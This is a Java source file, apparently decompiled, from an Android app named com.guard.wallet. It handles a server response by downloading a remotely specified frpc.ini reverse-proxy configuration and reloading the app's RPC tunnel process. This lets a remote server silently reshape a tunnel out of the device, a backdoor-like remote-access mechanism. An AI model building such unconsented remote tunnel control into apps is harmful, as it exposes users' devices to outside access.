package com.guard.wallet.http;
import com.guard.wallet.core.AppUtils;

import android.util.Log;
import com.guard.wallet.MainApplication;
import com.guard.wallet.resp.ApiResult;
import com.guard.wallet.resp.DeviceAgentFileVO;
import java.io.IOException;
import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.Response;
import okhttp3.ResponseBody;

/**
 * 查询代理文件回调 — vendor http/u.
 *
 * <p>查询网络代理配置文件(frpc.ini)，下载成功后重新加载 RPC 进程。
 */
public final class QueryAgentFileCallback implements Callback {
    @Override
    public void onFailure(Call call, IOException e) {
        AppUtils.s("QueryAgentFileCallback", e);
        if (!(e instanceof DuplicateRequestException)) { HttpClient.finishRequest(call.request().url().host()); HttpApiManager.routeForwarding(call, this); }
    }
    @Override
    public void onResponse(Call call, Response response) throws IOException {
        HttpClient.finishRequest(call.request().url().host());
        ResponseBody var6 = response.body();
        if (var6 != null) {
            try {
                // 非 JSON 响应直接跳过
                String contentType = response.header("Content-Type", "");
                if (!contentType.contains("application/json") && !contentType.contains("text/json")) {
                    Log.w("QueryAgentFileCallback", "Non-JSON response (HTTP " + response.code() + "), skipping");
                    var6.close();
                    response.close();
                    return;
                }
                QueryAgentFileCallback$1 var3 = new QueryAgentFileCallback$1();
                ApiResult var7 = (ApiResult) com.guard.wallet.utils.SharedPrefsManager.c(var6.string(), var3);
                if (var7 != null && var7.getSuccess() && var7.getData() != null) {
                    DeviceAgentFileVO var9 = (DeviceAgentFileVO) var7.getData();
                    if (!AppUtils.B(var9.getTargetFileUrl())) {
                        String var10 = com.guard.wallet.utils.SystemHelper.i0().concat("/frpc.ini");
                        Log.d("QueryAgentFileCallback", var10);
                        if (com.guard.wallet.utils.DownloadBridge.download(var9.getTargetFileUrl(), var10)) {
                            Log.d("QueryAgentFileCallback", "网络代理文件重新加载完成");
                            if (MainApplication.getInstance() != null) {
                                MainApplication.getInstance().reloadRpcProcess();
                            }
                        }
                    }
                }
            } catch (Exception var8) { AppUtils.s("QueryAgentFileCallback", var8); }
        }
        response.close();
    }
}
